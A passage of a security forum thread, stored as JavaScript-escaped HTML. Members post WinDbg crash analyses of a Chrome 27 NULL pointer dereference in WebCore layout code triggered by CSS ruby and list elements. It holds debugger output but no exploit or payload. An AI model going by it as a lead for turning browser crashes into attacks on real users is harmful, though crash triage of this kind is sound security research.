/>\n0:008&gt; g<br />\n(f90.c14): Access violation - code c0000005 (first chance)<br />\nFirst chance exceptions are reported before any exception handling.<br />\nThis exception may be expected and handled.<br />\neax=00000000 ebx=02e9f4fc ecx=02e9f568 edx=632476aa esi=02e9f45c edi=02e9f568<br />\neip=632476de esp=0024e778 ebp=0024e798 iopl=0         nv up ei ng nz ac po cy<br />\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010293<br />\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\Google\\Chrome\\Application\\27.0.1453.110\\chro  me.dll - <br />\nchrome_630c0000!ovly_debug_event+0x1678c9:<br />\n632476de 8b400c          mov     eax,dword ptr [eax+0Ch] ds:0023:0000000c=????????<br />\n0:000&gt; u<br />\nchrome_630c0000!ovly_debug_event+0x1678c9:<br />\n632476de 8b400c          mov     eax,dword ptr [eax+0Ch]<br />\n632476e1 3bc7            cmp     eax,edi<br />\n632476e3 75f5            jne     chrome_630c0000!ovly_debug_event+0x1678c5 (632476da)<br />\n632476e5 8b742410        mov     esi,dword ptr [esp+10h]<br />\n632476e9 8b4618          mov     eax,dword ptr [esi+18h]<br />\n632476ec c1e807          shr     eax,7<br />\n632476ef a801            test    al,1<br />\n632476f1 0f84b5000000    je      chrome_630c0000!ovly_debug_event+0x167997 (632477ac)<br />\n0:000&gt; kb<br />\nChildEBP RetAddr  Args to Child              <br />\nWARNING: Stack unwind information not available. Following frames may be wrong.<br />\n0024e798 63247683 02e9f400 02e9f4fc 02e9f4fc chrome_630c0000!ovly_debug_event+0x1678c9<br />\n0024e7b0 63253488 02e9f400 02e9f4fc 02e9f4fc chrome_630c0000!ovly_debug_event+0x16786e<br />\n0024e7c8 63bd8b79 02e9f400 02e9f4fc 02e9f45c chrome_630c0000!ovly_debug_event+0x173673<br />\n0024e7e4 63fa603f 02e9f400 02e9f4fc 02e9f384 chrome_630c0000!ovly_debug_event+0xaf8d64<br />\n0024e800 6358adb9 02e9f400 02e9f4fc 02e9f384 chrome_630c0000!ovly_debug_event+0xec622a<br />\n0024e828 6358ac14 00000000 63288d39 02e9f384 chrome_630c0000!ovly_debug_event+0x4aafa4<br />\n0024e87c 6328776c 02e9f318 00000000 0024e8a8 chrome_630c0000!ovly_debug_event+0x4aadff<br />\n0024e8c8 632848d8 00000001 0024e908 02e9f318 chrome_630c0000!ovly_debug_event+0x1a7957<br />\n0024e970 632842ac 00000001 00000000 02e9f318 chrome_630c0000!ovly_debug_event+0x1a4ac3<br />\n0024e990 63288d39 02e9f318 02e9f1d0 00000001 chrome_630c0000!ovly_debug_event+0x1a4497<br />\n0024e9dc 6328776c 02e9f1d0 00000000 0024ea08 chrome_630c0000!ovly_debug_event+0x1a8f24<br />\n0024ea28 632848d8 00000001 0024ea68 02e9f1d0 chrome_630c0000!ovly_debug_event+0x1a7957<br />\n0024ead0 632842ac 00000001 00000000 02e9f1d0 chrome_630c0000!ovly_debug_event+0x1a4ac3<br />\n0024eaf0 63288d39 02e9f1d0 02e9f010 00000001 chrome_630c0000!ovly_debug_event+0x1a4497<br />\n0024eb3c 6328776c 02e9f010 00000000 0024eb68 chrome_630c0000!ovly_debug_event+0x1a8f24<br />\n0024eb88 632848d8 00000001 0024ebc8 02e9f010 chrome_630c0000!ovly_debug_event+0x1a7957<br />\n0024ec30 632842ac 00000001 00000000 02e9f010 chrome_630c0000!ovly_debug_event+0x1a4ac3<br />\n0024ec50 63283d8d 02e9f010 00000000 01d24680 chrome_630c0000!ovly_debug_event+0x1a4497<br />\n0024ecf8 6328210a 02e97000 01cd8000 02e9f010 chrome_630c0000!ovly_debug_event+0x1a3f78<br />\n0024edbc 63258191 00000001 01cd8040 01cd8000 chrome_630c0000!ovly_debug_event+0x1a22f5<br />\n0:000&gt; u<br />\nchrome_630c0000!ovly_debug_event+0x1678e2:<br />\n632476f7 e81ffafbff      call    chrome_630c0000!ovly_debug_event+0x127306 (6320711b)<br />\n632476fc 84c0            test    al,al<br />\n632476fe 755b            jne     chrome_630c0000!ovly_debug_event+0x167946 (6324775b)<br />\n63247700 8b742410        mov     esi,dword ptr [esp+10h]<br />\n63247704 8b16            mov     edx,dword ptr [esi]<br />\n63247706 8b8214010000    mov     eax,dword ptr [edx+114h]<br />\n6324770c 8bce            mov     ecx,esi<br />\n6324770e ffd0            call    eax<br />\n0:000&gt; u chrome_630c0000!ovly_debug_event+0x167946<br />\nchrome_630c0000!ovly_debug_event+0x167946:<br />\n6324775b 8b7508          mov     esi,dword ptr [ebp+8]<br />\n6324775e 8b4618          mov     eax,dword ptr [esi+18h]<br />\n63247761 c1e80a          shr     eax,0Ah<br />\n63247764 a801            test    al,1<br />\n63247766 752f            jne     chrome_630c0000!ovly_debug_event+0x167982 (63247797)<br />\n63247768 8b4b0c          mov     ecx,dword ptr [ebx+0Ch]<br />\n6324776b 8b11            mov     edx,dword ptr [ecx]<br />\n6324776d 8b421c          mov     eax,dword ptr [edx+1Ch]\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">Hacking Is a Matter of Time Knowledge and Patience</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_11859" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_11859" class="newreply" href="newreply.php?do=newreply&amp;p=11859" rel="nofollow" title="Reply With Quote"><img id="quoteimg_11859" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[11860] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_11860">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">06-07-2013,&nbsp;<span class="time">01:35 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post11860" href="showthread.php?t=4895&amp;p=11860&amp;viewfull=1#post11860" class="postcounter">#3</a><a id="postcount11860" name="3"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=8" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=8" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://Garage4Hackers.com" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="fb1h2s is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_11860_8" title="fb1h2s has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=8" title="fb1h2s is offline">\r\n				<img src="image.php?u=8&amp;dateline=1400680840" alt="fb1h2s\'s Avatar" title="fb1h2s\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>India</dd>\r\n					\r\n					<dt>Posts</dt> <dd>616</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=8">32</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_11860">\r\n						<blockquote class="postcontent restore ">\r\n							0:000&gt; !analyze -v<br />\r\nFAULTING_IP: <br />\r\nchrome_630c0000!ovly_debug_event+1678c9<br />\r\n632476de 8b400c          mov     eax,dword ptr [eax+0Ch]<br />\r\n<br />\r\nEXCEPTION_RECORD:  ffffffff -' + '- (.exr 0xffffffffffffffff)<br />\r\nExceptionAddress: 632476de (chrome_630c0000!ovly_debug_event+0x001678c9)<br />\r\n   ExceptionCode: c0000005 (Access violation)<br />\r\n  ExceptionFlags: 00000000<br />\r\nNumberParameters: 2<br />\r\n   Parameter[0]: 00000000<br />\r\n   Parameter[1]: 0000000c<br />\r\nAttempt to read from address 0000000c<br />\r\n<br />\r\nFAULTING_THREAD:  00000864<br />\r\n<br />\r\nPROCESS_NAME:  chrome.exe<br />\r\n<br />\r\nADDITIONAL_DEBUG_TEXT:  <br />\r\nUse \'!findthebuild\' command to search for the target build information.<br />\r\nIf the build information is available, run \'!findthebuild -s ; .reload\' to set symbol path and load symbols.<br />\r\n<br />\r\nFAULTING_MODULE: 77840000 ntdll<br />\r\n<br />\r\nDEBUG_FLR_IMAGE_TIMESTAMP:  51a5663c<br />\r\n<br />\r\nERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.<br />\r\n<br />\r\nEXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.<br />\r\n<br />\r\nEXCEPTION_PARAMETER1:  00000000<br />\r\n<br />\r\nEXCEPTION_PARAMETER2:  0000000c<br />\r\nREAD_ADDRESS:  0000000c <br />\r\n<br />\r\nFOLLOWUP_IP: <br />\r\nchrome_630c0000!ovly_debug_event+1678c9<br />\r\n632476de 8b400c          mov     eax,dword ptr [eax+0Ch]<br />\r\n<br />\r\nBUGCHECK_STR:  APPLICATION_FAULT_NULL_CLASS_PTR_DEREFERENCE_INVAL  ID_POINTER_READ_WRONG_SYMBOLS<br />\r\n<br />\r\nPRIMARY_PROBLEM_CLASS:  NULL_CLASS_PTR_DEREFERENCE<br />\r\n<br />\r\nDEFAULT_BUCKET_ID:  NULL_CLASS_PTR_DEREFERENCE<br />\r\n<br />\r\nLAST_CONTROL_TRANSFER:  from 63247683 to 632476de<br />\r\n<br />\r\nSTACK_TEXT:  <br />\r\nWARNING: Stack unwind information not available. Following frames may be wrong.<br />\r\n0025e398 63247683 02610400 026104fc 026104fc chrome_630c0000!ovly_debug_event+0x1678c9<br />\r\n0025e3b0 63253488 02610400 026104fc 026104fc chrome_630c0000!ovly_debug_event+0x16786e<br />\r\n0025e3c8 63bd8b79 02610400 026104fc 0261045c chrome_630c0000!ovly_debug_event+0x173673<br />\r\n0025e3e4 63fa603f 02610400 026104fc 02610384 chrome_630c0000!ovly_debug_event+0xaf8d64<br />\r\n0025e400 6358adb9 02610400 026104fc 02610384 chrome_630c0000!ovly_debug_event+0xec622a<br />\r\n0025e428 6358ac14 00000000 63288d39 02610384 chrome_630c0000!ovly_debug_event+0x4aafa4<br />\r\n0025e47c 6328776c 02610318 00000000 0025e4a8 chrome_630c0000!ovly_debug_event+0x4aadff<br />\r\n0025e4c8 632848d8 00000001 0025e508 02610318 chrome_630c0000!ovly_debug_event+0x1a7957<br />\r\n0025e570 632842ac 00000001 00000000 02610318 chrome_630c0000!ovly_debug_event+0x1a4ac3<br />\r\n0025e590 63288d39 02610318 026101d0 00000001 chrome_630c0000!ovly_debug_event+0x1a4497<br />\r\n0025e5dc 6328776c 026101d0 00000000 0025e608 chrome_630c0000!ovly_debug_event+0x1a8f24<br />\r\n0025e628 632848d8 00000001 0025e668 026101d0 chrome_630c0000!ovly_debug_event+0x1a7957<br />\r\n0025e6d0 632842ac 00000001 00000000 026101d0 chrome_630c0000!ovly_debug_event+0x1a4ac3<br />\r\n0025e6f0 63288d39 026101d0 02610010 00000001 chrome_630c0000!ovly_debug_event+0x1a4497<br />\r\n0025e73c 6328776c 02610010 00000000 0025e768 chrome_630c0000!ovly_debug_event+0x1a8f24<br />\r\n0025e788 632848d8 00000001 0025e7c8 02610010 chrome_630c0000!ovly_debug_event+0x1a7957<br />\r\n0025e830 632842ac 00000001 00000000 02610010 chrome_630c0000!ovly_debug_event+0x1a4ac3<br />\r\n0025e850 63283d8d 02610010 00000000 00ff4680 chrome_630c0000!ovly_debug_event+0x1a4497<br />\r\n0025e8f8 6328210a 02601000 00fa8000 02610010 chrome_630c0000!ovly_debug_event+0x1a3f78<br />\r\n0025e9bc 63258191 00000001 00fa8040 00fa8000 chrome_630c0000!ovly_debug_event+0x1a22f5<br />\r\n0025e9e8 63257e44 02601000 00000000 0025ea70 chrome_630c0000!ovly_debug_event+0x17837c<br />\r\n0025e9f8 632579b9 00fa8000 00fa8040 02601000 chrome_630c0000!ovly_debug_event+0x17802f<br />\r\n0025ea70 63256512 00fa8000 63254376 00fa8000 chrome_630c0000!ovly_debug_event+0x177ba4<br />\r\n0025eae0 6320fbbd 02626fec 02626fc0 02626fc0 chrome_630c0000!ovly_debug_event+0x1766fd<br />\r\n0025eaf8 6320f3b0 00fa8000 02bd1e54 00000000 chrome_630c0000!ovly_debug_event+0x12fda8<br />\r\n0025eb14 6320e095 02bd1e00 02bd1e00 631eecaa chrome_630c0000!ovly_debug_event+0x12f59b<br />\r\n0025eb30 634239c3 45a1cac1 40bbb356 0025eba4 chrome_630c0000!ovly_debug_event+0x12e280<br />\r\n0025eb8c 634238ee 02629400 00000001 025d62e0 chrome_630c0000!ovly_debug_event+0x343bae<br />\r\n0025ebb8 632d9268 00faaf00 00000001 00000000 chrome_630c0000!ovly_debug_event+0x343ad9<br />\r\n0025ebf0 63423792 00000000 00000001 65087cc0 chrome_630c0000!ovly_debug_event+0x1f9453<br />\r\n0025ec60 63423681 45a1cac1 40bbb356 0025ec84 chrome_630c0000!ovly_debug_event+0x34397d<br />\r\n0025ec70 634235f4 025d6490 45a1cac1 40bbb356 chrome_630c0000!ovly_debug_event+0x34386c<br />\r\n0025ec84 63423532 0257da50 45a1cac1 40bbb356 chrome_630c0000!ovly_debug_event+0x3437df<br />\r\n0025ed54 63422e41 00000000 00000000 0025edd4 chrome_630c0000!ovly_debug_event+0x34371d<br />\r\n0025ed88 63422d35 00000001 00000000 00000000 chrome_630c0000!ovly_debug_event+0x34302c<br />\r\n0025eda4 63422a7d 00fb0780 63422dad 0025edc8 chrome_630c0000!ovly_debug_event+0x342f20<br />\r\n0025edfc 632cc1f6 02be2bb4 00fb0780 00fb0780 chrome_630c0000!ovly_debug_event+0x342c68<br />\r\n0025eea4 6316d09a 02be2bb4 00fb8a04 02be2bb4 chrome_630c0000!ovly_debug_event+0x1ec3e1<br />\r\n0025eec8 6316ce35 02be2bb4 00fcbe10 6563c8d4 chrome_630c0000!ovly_debug_event+0x8d285<br />\r\n0025ef34 6311c9fc 02be2bb4 0025f4f8 0025f418 chrome_630c0000!ovly_debug_event+0x8d020<br />\r\n0025ef64 63100bdf 02be2bb4 0025f418 0025f008 chrome_630c0000!ovly_debug_event+0x3cbe7<br />\r\n0025ef74 630f4259 02be2ba0 0025f418 02be2ba4 chrome_630c0000!ovly_debug_event+0x20dca<br />\r\n0025f008 630f3c12 0025f418 0025f030 0025f418 chrome_630c0000!ovly_debug_event+0x14444<br />\r\n0025f158 630f5162 0025f418 0025f1c4 00000000 chrome_630c0000!ovly_debug_event+0x13dfd<br />\r\n0025f184 630f3818 0025f418 64f53bcc 0025f1c4 chrome_630c0000!ovly_debug_event+0x1534d<br />\r\n0025f1a8 630f3770 64f9e51c 00000000 0025f1e0 chrome_630c0000!ovly_debug_event+0x13a03<br />\r\n0025f1b8 63125813 00000000 0025f418 00000000 chrome_630c0000!ovly_debug_event+0x1395b<br />\r\n0025f1e0 631467b1 00fafe40 00000001 00000000 chrome_630c0000!ovly_debug_event+0x459fe<br />\r\n0025f594 630d990c 0025f5c8 00fafe10 00000000 chrome_630c0000!ovly_debug_event+0x6699c<br />\r\n0025f5a8 630d9893 0025f5d8 0025f5c8 0025f63c chrome_630c0000!ChromeMain+0xf2db<br />\r\n0025f614 630ca95d 008aafd8 008a5030 0025f65c chrome_630c0000!ChromeMain+0xf262<br />\r\n0025f624 630ca64f 00080000 0025f6ec 0025f63c chrome_630c0000!ChromeMain+0x32c<br />\r\n0025f65c 000a59d3 00080000 0025f6ec 0025f6f4 chrome_630c0000!ChromeMain+0x1e<br />\r\n0025f6d4 000a8b6e 00080000 0025f6ec 00000000 chrome+0x259d3<br />\r\n0025f6f8 000a8bd9 00080000 00000000 003e5920 chrome!SetPrinterInfo+0x76a<br />\r\n0025f740 000c667d 00080000 00000000 003d1976 chrome!SetPrinterInfo+0x7d5<br />\r\n0025f7d0 77361174 7ffd5000 0025f81c 7789b3f5 chrome!SetPrinterInfo+0x1e279<br />\r\n0025f7dc 7789b3f5 7ffd5000 77dfc297 00000000 kernel32!BaseThreadInitThunk+0x12<br />\r\n0025f81c 7789b3c8 000c66d0 7ffd5000 ffffffff ntdll!RtlInitializeExceptionChain+0x63<br />\r\n0025f834 00000000 000c66d0 7ffd5000 00000000 ntdll!RtlInitializeExceptionChain+0x36<br />\r\n<br />\r\n<br />\r\nSYMBOL_STACK_INDEX:  0<br />\r\n<br />\r\nSYMBOL_NAME:  chrome!ovly_debug_event+1678c9<br />\r\n<br />\r\nFOLLOWUP_NAME:  MachineOwner<br />\r\n<br />\r\nMODULE_NAME: chrome_630c0000<br />\r\n<br />\r\nIMAGE_NAME:  chrome.dll<br />\r\n<br />\r\nSTACK_COMMAND:  ~0s ; kb<br />\r\n<br />\r\nBUCKET_ID:  WRONG_SYMBOLS<br />\r\n<br />\r\nFAILURE_BUCKET_ID:  NULL_CLASS_PTR_DEREFERENCE_c0000005_chrome.dll!ovl  y_debug_event<br />\r\n<br />\r\nWATSON_STAGEONE_URL:  <a href="http://watson.microsoft.com/StageOne/chrome_exe/27_0_1453_110/51a566a7/chrome_dll/27_0_1453_110/51a5663c/c0000005/001876de.htm?Retriage=1" target="_blank">http://watson.microsoft.com/StageOne...htm?Retriage=1</a><br />\r\n<br />\r\n<br />\r\n0:000&gt; r<br />\r\neax=00000000 ebx=026104fc ecx=02610568 edx=632476aa esi=0261045c edi=02610568<br />\r\neip=632476de esp=0025e378 ebp=0025e398 iopl=0         nv up ei ng nz ac po cy<br />\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010293<br />\r\nchrome_630c0000!ovly_debug_event+0x1678c9:<br />\r\n632476de 8b400c          mov     eax,dword ptr [eax+0Ch] ds:0023:0000000c=????????\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">Hacking Is a Matter of Time Knowledge and Patience</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_11860" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_11860" class="newreply" href="newreply.php?do=newreply&amp;p=11860" rel="nofollow" title="Reply With Quote"><img id="quoteimg_11860" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[11862] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_11862">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">06-07-2013,&nbsp;<span class="time">02:44 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post11862" href="showthread.php?t=4895&amp;p=11862&amp;viewfull=1#post11862" class="postcounter">#4</a><a id="postcount11862" name="4"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=424" title="webdevil is offline"><strong>webdevil</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=424" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=424&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=424" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=424" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/424-webdevil" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="webdevil is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_11862_424" title="webdevil is on a distinguished road">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Feb 2011</dd>\r\n					<dt>Location</dt> <dd>Hyd</dd>\r\n					\r\n					<dt>Posts</dt> <dd>49</dd>	\r\n					\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_11862">\r\n						<blockquote class="postcontent restore ">\r\n							You kinda get alot of NULL Pointers with css. This is just one of \'em :-)<br />\r\n<br />\r\nStack Trace with symbols. <br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:372px;">4:064&gt; k\r\nChildEBP RetAddr  \r\n006ae7d8 52df7683 chrome_52c70000!WebCore::RenderBlock::addChildIgnoringAnonymousColumnBlocks+0x34 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 810]\r\n006ae7f0 52e03488 chrome_52c70000!WebCore::RenderBlock::addChildIgnoringContinuation+0x85 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 949]\r\n006ae808 53788b79 chrome_52c70000!WebCore::RenderBlock::addChild+0x57 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 941]\r\n006ae824 53b5603f chrome_52c70000!WebCore::RenderRubyRun::addChild+0x143 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderrubyrun.cpp @ 154]\r\n006ae840 5313adb9 chrome_52c70000!WebCore::RenderRubyAsBlock::addChild+0x185 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderruby.cpp @ 280]\r\n006ae868 5313ac14 chrome_52c70000!WebCore::RenderListItem::updateMarkerLocation+0xb3 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderlistitem.cpp @ 268]\r\n006ae870 52e38d39 chrome_52c70000!WebCore::RenderListItem::layout+0xa [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderlistitem.cpp @ 282]\r\n006ae8bc 52e3776c chrome_52c70000!WebCore::RenderBlock::layoutBlockChild+0x2e8 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 2557]\r\n006ae908 52e348d8 chrome_52c70000!WebCore::RenderBlock::layoutBlockChildren+0x24f [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 2476]\r\n006ae9b0 52e342ac chrome_52c70000!WebCore::RenderBlock::layoutBlock+0x2c1 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 1583]\r\n006ae9d0 52e38d39 chrome_52c70000!WebCore::RenderBlock::layout+0x39 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 1389]\r\n006aea1c 52e3776c chrome_52c70000!WebCore::RenderBlock::layoutBlockChild+0x2e8 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 2557]\r\n006aea68 52e348d8 chrome_52c70000!WebCore::RenderBlock::layoutBlockChildren+0x24f [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 2476]\r\n006aeb10 52e342ac chrome_52c70000!WebCore::RenderBlock::layoutBlock+0x2c1 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 1583]\r\n006aeb30 52e38d39 chrome_52c70000!WebCore::RenderBlock::layout+0x39 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 1389]\r\n006aeb7c 52e3776c chrome_52c70000!WebCore::RenderBlock::layoutBlockChild+0x2e8 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 2557]\r\n006aebc8 52e348d8 chrome_52c70000!WebCore::RenderBlock::layoutBlockChildren+0x24f [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 2476]\r\n006aec70 52e342ac chrome_52c70000!WebCore::RenderBlock::layoutBlock+0x2c1 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 1583]\r\n006aec90 52e33d8d chrome_52c70000!WebCore::RenderBlock::layout+0x39 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderblock.cpp @ 1389]\r\n006aed38 52e3210a chrome_52c70000!WebCore::RenderView::layout+0x3c8 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\rendering\\renderview.cpp @ 276]\r\n006aedfc 52e08191 chrome_52c70000!WebCore::FrameView::layout+0x782 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\page\\frameview.cpp @ 1271]\r\n006aee28 52e07e44 chrome_52c70000!WebCore::Document::implicitClose+0x348 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\dom\\document.cpp @ 2510]\r\n006aee38 52e079b9 chrome_52c70000!WebCore::FrameLoader::checkCallImplicitClose+0x4e 